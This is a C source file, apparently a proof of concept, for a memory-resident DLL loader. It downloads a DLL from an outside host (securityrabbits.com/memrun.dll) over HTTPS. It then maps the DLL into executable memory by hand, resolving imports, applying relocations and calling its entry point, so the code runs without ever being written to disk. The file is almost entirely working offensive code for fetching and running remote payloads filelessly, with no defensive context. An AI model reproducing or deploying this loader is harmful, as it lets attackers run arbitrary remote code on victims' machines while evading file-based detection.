#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#pragma comment(lib, "winhttp.lib")

// Define DllEntryProc type
typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

// Function to download data from URL
BYTE* DownloadFromURL(LPCWSTR server, LPCWSTR path, DWORD* dwSize) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BYTE* buffer = NULL;
    DWORD dwDownloaded = 0;
    DWORD dwTotalSize = 0;
    
    hSession = WinHttpOpen(L"MemoryLoader/1.0", 
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, 
                           WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTPS_PORT, 0);
        
        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, 
                                          WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
            
            if (hRequest) {
                if (WinHttpSendRequest(hRequest, 
                                       WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                       WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                    
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        DWORD dwSizeOfSize = sizeof(DWORD);
                        WinHttpQueryHeaders(hRequest, 
                                           WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
                                           NULL, &dwTotalSize, &dwSizeOfSize, NULL);
                        
                        buffer = (BYTE*)VirtualAlloc(NULL, dwTotalSize + 1, 
                                                     MEM_COMMIT | MEM_RESERVE, 
                                                     PAGE_READWRITE);
                        
                        if (buffer) {
                            DWORD dwBytesRead = 0;
                            DWORD dwBytesAvailable = 0;
                            
                            while (WinHttpQueryDataAvailable(hRequest, &dwBytesAvailable) && 
                                   dwBytesAvailable > 0) {
                                if (!WinHttpReadData(hRequest, buffer + dwDownloaded, 
                                                     dwBytesAvailable, &dwBytesRead)) {
                                    break;
                                }
                                dwDownloaded += dwBytesRead;
                                if (dwDownloaded >= dwTotalSize) break;
                            }
                            
                            *dwSize = dwDownloaded;
                            
                            if (dwDownloaded == 0) {
                                VirtualFree(buffer, 0, MEM_RELEASE);
                                buffer = NULL;
                            }
                        }
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    
    return buffer;
}

// Resolve imports for manually loaded DLL
BOOL ResolveImports(PIMAGE_NT_HEADERS ntHeaders, LPVOID baseAddress) {
    // Check if there's an import directory
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress == 0) {
        return TRUE; // No imports
    }
    
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)
        ((ULONG_PTR)baseAddress + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    
    while (importDesc->Name) {
        char* dllName = (char*)((ULONG_PTR)baseAddress + importDesc->Name);
        HMODULE hModule = GetModuleHandleA(dllName);
        
        if (!hModule) {
            hModule = LoadLibraryA(dllName);
        }
        
        if (!hModule) {
            printf("[-] Failed to load dependency: %s\n", dllName);
            return FALSE;
        }
        
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)baseAddress + importDesc->FirstThunk);
        PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)baseAddress + importDesc->OriginalFirstThunk);
        
        if (!originalThunk) {
            originalThunk = thunk;
        }
        
        while (originalThunk->u1.AddressOfData) {
            FARPROC funcAddress = NULL;
            
            if (originalThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                // Import by ordinal
                funcAddress = GetProcAddress(hModule, (LPCSTR)(originalThunk->u1.Ordinal & 0xFFFF));
            } else {
                // Import by name
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)baseAddress + originalThunk->u1.AddressOfData);
                funcAddress = GetProcAddress(hModule, importByName->Name);
            }
            
            if (!funcAddress) {
                printf("[-] Failed to resolve import for function\n");
                return FALSE;
            }
            
            thunk->u1.Function = (ULONGLONG)funcAddress;
            thunk++;
            originalThunk++;
        }
        
        importDesc++;
    }
    
    return TRUE;
}

// Apply relocations for manually loaded DLL
BOOL ApplyRelocations(PIMAGE_NT_HEADERS ntHeaders, LPVOID baseAddress, LPVOID preferredBase) {
    ULONG_PTR delta = (ULONG_PTR)baseAddress - (ULONG_PTR)preferredBase;
    
    if (delta == 0) {
        return TRUE; // No relocation needed
    }
    
    // Check if there's a relocation directory
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0) {
        printf("[!] No relocation data available, DLL may not work at current address\n");
        return FALSE;
    }
    
    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)
        ((ULONG_PTR)baseAddress + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    
    while (reloc->VirtualAddress) {
        DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
        
        for (DWORD i = 0; i < numEntries; i++) {
            if (entries[i] == 0) continue;
            
            DWORD type = entries[i] >> 12;
            DWORD offset = entries[i] & 0xFFF;
            
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONG_PTR* patchAddress = (ULONG_PTR*)((ULONG_PTR)baseAddress + reloc->VirtualAddress + offset);
                *patchAddress += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD* patchAddress = (DWORD*)((ULONG_PTR)baseAddress + reloc->VirtualAddress + offset);
                *patchAddress += (DWORD)delta;
            }
        }
        
        reloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)reloc + reloc->SizeOfBlock);
    }
    
    return TRUE;
}

// Complete manual DLL loader
HMODULE ManualLoadLibraryFull(BYTE* dllData) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllData;
    
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS signature\n");
        return NULL;
    }
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dllData + dosHeader->e_lfanew);
    
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT signature\n");
        return NULL;
    }
    
    printf("[*] DLL ImageBase: 0x%p\n", (LPVOID)ntHeaders->OptionalHeader.ImageBase);
    printf("[*] DLL SizeOfImage: 0x%X\n", ntHeaders->OptionalHeader.SizeOfImage);
    
    // Allocate memory for the DLL at preferred base or anywhere
    LPVOID baseAddress = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase,
                                      ntHeaders->OptionalHeader.SizeOfImage,
                                      MEM_RESERVE | MEM_COMMIT,
                                      PAGE_EXECUTE_READWRITE);
    
    if (!baseAddress) {
        // If preferred base is taken, let Windows choose
        printf("[*] Preferred base not available, letting Windows choose...\n");
        baseAddress = VirtualAlloc(NULL,
                                  ntHeaders->OptionalHeader.SizeOfImage,
                                  MEM_RESERVE | MEM_COMMIT,
                                  PAGE_EXECUTE_READWRITE);
        
        if (!baseAddress) {
            printf("[-] Failed to allocate memory for DLL (Error: %lu)\n", GetLastError());
            return NULL;
        }
        
        printf("[*] Allocated at: 0x%p (preferred: 0x%p)\n", baseAddress, (LPVOID)ntHeaders->OptionalHeader.ImageBase);
        
        // Apply relocations
        if (!ApplyRelocations(ntHeaders, baseAddress, (LPVOID)ntHeaders->OptionalHeader.ImageBase)) {
            printf("[-] Failed to apply relocations\n");
            VirtualFree(baseAddress, 0, MEM_RELEASE);
            return NULL;
        }
    } else {
        printf("[*] Loaded at preferred base: 0x%p\n", baseAddress);
    }
    
    // Copy headers
    memcpy(baseAddress, dllData, ntHeaders->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData) {
            memcpy((BYTE*)baseAddress + sectionHeader[i].VirtualAddress,
                   dllData + sectionHeader[i].PointerToRawData,
                   sectionHeader[i].SizeOfRawData);
        }
    }
    
    // Resolve imports
    if (!ResolveImports(ntHeaders, baseAddress)) {
        printf("[-] Failed to resolve imports\n");
        VirtualFree(baseAddress, 0, MEM_RELEASE);
        return NULL;
    }
    
    // Set correct memory protection
    for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        DWORD protect = PAGE_READONLY;
        DWORD characteristics = sectionHeader[i].Characteristics;
        
        if (characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (characteristics & IMAGE_SCN_MEM_READ) {
                if (characteristics & IMAGE_SCN_MEM_WRITE) {
                    protect = PAGE_EXECUTE_READWRITE;
                } else {
                    protect = PAGE_EXECUTE_READ;
                }
            }
        } else if (characteristics & IMAGE_SCN_MEM_READ) {
            if (characteristics & IMAGE_SCN_MEM_WRITE) {
                protect = PAGE_READWRITE;
            } else {
                protect = PAGE_READONLY;
            }
        }
        
        DWORD oldProtect;
        VirtualProtect((BYTE*)baseAddress + sectionHeader[i].VirtualAddress,
                      sectionHeader[i].Misc.VirtualSize,
                      protect,
                      &oldProtect);
    }
    
    // Call entry point if it exists
    if (ntHeaders->OptionalHeader.AddressOfEntryPoint) {
        DllEntryProc entry = (DllEntryProc)((ULONG_PTR)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        
        if (entry) {
            printf("[*] Calling DllMain (DLL_PROCESS_ATTACH)...\n");
            entry((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, NULL);
        }
    }
    
    return (HMODULE)baseAddress;
}

int main() {
    BYTE* dllData = NULL;
    DWORD dllSize = 0;
    HMODULE hLoadedDLL = NULL;
    
    printf("[*] Memory-resident DLL Loader PoC (Full Version)\n");
    printf("[*] Downloading DLL from server...\n");
    
    // Download DLL from server
    dllData = DownloadFromURL(L"securityrabbits.com", L"/memrun.dll", &dllSize);
    
    if (dllData && dllSize > 0) {
        printf("[+] DLL downloaded successfully (%d bytes)\n", dllSize);
        
        // Full manual loading with import resolution
        printf("[*] Loading DLL manually with full import resolution...\n");
        hLoadedDLL = ManualLoadLibraryFull(dllData);
        
        if (hLoadedDLL) {
            printf("[+] DLL loaded successfully at: 0x%p\n", hLoadedDLL);
                        
        } else {
            printf("[-] Failed to load DLL\n");
        }
        
        // Clean up
        VirtualFree(dllData, 0, MEM_RELEASE);
    } else {
        printf("[-] Failed to download DLL (Error: %lu)\n", GetLastError());
    }
    
    printf("[*] Press Enter to exit...");
    getchar();
    
    return 0;
}
